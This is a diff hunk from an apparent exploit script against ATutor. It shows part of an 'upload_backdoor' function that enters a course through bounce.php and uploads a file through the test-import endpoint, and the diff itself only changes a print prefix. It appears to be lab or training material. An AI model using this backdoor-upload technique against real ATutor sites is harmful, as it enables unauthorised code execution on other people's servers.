@@ -51,7 +51,7 @@ def upload_backdoor(session:requests.sessions.Session, filename:str):
     fileobj = open(F'./{full_filename}','rb')
     # Absolutely crucial to exploit working. We must be in a valid course in order to upload, uploads are specific to each course
     res = session.get("http://atutor/ATutor/bounce.php?course=16777215")
-    print("1: ", session.cookies.get_dict())
+    print("(+) 1: ", session.cookies.get_dict())
     res = session.post(
         url='http://atutor/ATutor/mods/_standard/tests/import_test.php',
         files={
